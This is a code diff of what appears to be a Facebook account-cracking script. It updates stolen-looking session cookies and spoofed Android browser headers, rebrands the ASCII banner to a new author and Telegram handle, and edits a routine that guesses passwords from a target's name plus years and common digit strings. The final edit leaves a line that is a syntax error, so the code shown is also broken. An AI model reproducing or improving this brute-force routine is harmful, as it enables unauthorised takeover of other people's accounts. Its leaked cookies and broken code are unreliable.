@@ -3,29 +3,33 @@ from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import requests
 cookies = {
-    'datr': 'OmBuZEQAbx34QvZEUeivUvap',
-    'sb': 'OmBuZFGLLXgy8aXSdma6cdxA',
-    'dnonce': 'AWkN6pbjI--HKzAju9q-h2l61nZ3dAUQ5XWJ1w-OPjndbOc74Gj8I_ZSdP0xP8UXa8OiEc0zx-swn60DPzCpG1xL',
-    'fr': '0YdvSmkUVEgMHB6mI..BkbmA6.Tr.AAA.0.0.BkbmBU.AWUEZrjUnJY',
+    'datr': 'ROqqZCfBZWwA6M7j06ZEbe27',
+    'sb': 'ROqqZOsVz1Fdg9ZekRY2uEEX',
+    'm_pixel_ratio': '2.75',
+    'wd': '393x720',
+    'fr': '0wCY6rArDP8GNB7DK..BkqupG.ob.AAA.0.0.Bkrsdo.AWVR2c4HaRo',
 }
 
 headers = {
-    'authority': 'free.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
-    'origin': 'https://free.facebook.com',
-    'referer': 'https://free.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    # 'cookie': 'datr=ROqqZCfBZWwA6M7j06ZEbe27; sb=ROqqZOsVz1Fdg9ZekRY2uEEX; m_pixel_ratio=2.75; wd=393x720; fr=0wCY6rArDP8GNB7DK..BkqupG.ob.AAA.0.0.Bkrsdo.AWVR2c4HaRo',
+    'referer': 'https://www.google.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'cross-site',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
+    'viewport-width': '980',
 }
 
 params = {
@@ -229,9 +233,9 @@ def banner():
 ───▐██──▀▀──▀▀──██▌───
 ──▄████▄──▐▌──▄████▄──
 
-AUTHOR: 𝐌𝐑_𝐃𝐘𝐍𝐎
-UPDATED BY: 𝐌𝐑_𝐃𝐘𝐍𝐎
-TELEGRAM: @i4m_DYNO
+AUTHOR: LUNA💖
+UPDATED BY: LUNA-_-
+TELEGRAM: @i4m_LUNA
 ---------------------------------------------  
                                                                    
               
@@ -341,13 +345,7 @@ def passwrd():
 					pwv.append(frs+"1993")
 					pwv.append(frs+"1994")
 					pwv.append(frs+"1995")
-					pwv.append(frs+"0750")
-					pwv.append(frs+"1234")
-					pwv.append(frs+"12345")
-					pwv.append(frs+"123456")
-					pwv.append(frs+"4321")
-					pwv.append(frs+"321")
-					pwv.append(frs+"54321")
+					pwv.append(frs+"0750")1
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
